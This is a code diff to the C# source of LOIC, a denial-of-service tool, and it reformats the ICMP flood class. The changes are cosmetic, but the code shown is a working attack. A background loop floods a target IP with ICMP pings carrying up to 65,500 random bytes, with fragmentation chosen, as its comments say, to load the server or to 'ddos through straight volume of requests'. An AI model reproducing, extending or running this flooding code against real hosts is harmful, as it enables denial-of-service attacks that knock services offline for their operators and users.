@@ -527,15 +527,12 @@ namespace LOIC
 		}
 	} // class SlowLoic
 
-
-     //start of ICMP class
-
+    //start of ICMP class
     public class ICMP : cHLDos
     {
-   
         private string _ip;
         private int _port;
-        
+
         private Random _random;
         private int _PingsPerThread;
         private byte[] _BytesToSend;
@@ -547,38 +544,37 @@ namespace LOIC
         /// <summary>
         /// Create the ICMP object, because we need that, for reasons
         /// </summary>
-
         public ICMP(string ip, int port, bool RandomMessage, int PingsPerThread)
         {
-           this._ip = ip;
-           this._port = port;
-           this._PingsPerThread = PingsPerThread;
-           this._pingSender = new Ping();
-           this._RandomMessage = RandomMessage;
-           this._BytesToSend = new byte[65000];
-           this._random = new Random();
+            this._ip = ip;
+            this._port = port;
+            this._PingsPerThread = PingsPerThread;
+            this._pingSender = new Ping();
+            this._RandomMessage = RandomMessage;
+            this._BytesToSend = new byte[65000];
+            this._random = new Random();
 
-           this._opt = new PingOptions();
-           this._opt.DontFragment = false;
-           this._opt.Ttl = 128;
+            this._opt = new PingOptions();
+            this._opt.DontFragment = false;
+            this._opt.Ttl = 128;
 
             _opt = new PingOptions();
+
             if (RandomMessage)
             {
                 //if we're sending messages, fragment as greater processing power needed on server to reconstruct
                 _opt.DontFragment = false;
-            }else
+            }
+            else
             {
                 //not sending messages, don't fragment, ddos through straight volume of requests
                 _opt.DontFragment = true;
             }
-            //def ttl 
-           _opt.Ttl = 128;
-                            
-          
+
+            //def ttl
+            _opt.Ttl = 128;
         }
 
-       
         public override void Start()
         {
             this.IsFlooding = true;
@@ -587,17 +583,16 @@ namespace LOIC
             this.bw.RunWorkerAsync();
             this.bw.WorkerSupportsCancellation = true;
         }
-      
 
         public override void Stop()
         {
             this.IsFlooding = false;
             this.bw.CancelAsync();
         }
-       
-        //while working away
-        private  void bw_DoWork (object sender, EventArgs e){
 
+        //while working away
+        private  void bw_DoWork (object sender, EventArgs e)
+        {
             while (this.IsFlooding)
             {
                 _BytesToSend = new Byte[0];
@@ -605,7 +600,7 @@ namespace LOIC
                 if (_RandomMessage)
                 {
                     _BytesToSend = new Byte[65500];
-                    //fill an array with 0 to 65499 random bytes bytes               
+                    //fill an array with 0 to 65499 random bytes bytes
                     int b = 0;
                     while (b < _random.Next(0,65499))
                     {
@@ -613,8 +608,7 @@ namespace LOIC
                         b++;
                     }
                 }
-               
-                                                 
+
                 State = ReqState.Ready;
 
                 for (int i = 0; i < _PingsPerThread; i++)
@@ -622,11 +616,10 @@ namespace LOIC
                     State = ReqState.Connecting;
                     try
                     {
-                        //send the data with a timeout value of 10ms 
+                        //send the data with a timeout value of 10ms
                         _pingSender.SendAsync(_ip, 10, _BytesToSend, _opt);
                         Requested++;
                     }
-                   
                     catch (Exception)
                     {
                         Failed++;
@@ -636,15 +629,12 @@ namespace LOIC
                     {
                         _pingSender.SendAsyncCancel();
                         _pingSender.Dispose();
-                       
                     }
                     catch { }
                     State = ReqState.Completed;
                 }
                 State = ReqState.Ready;
             }
-        
-          
         }
     }
 }
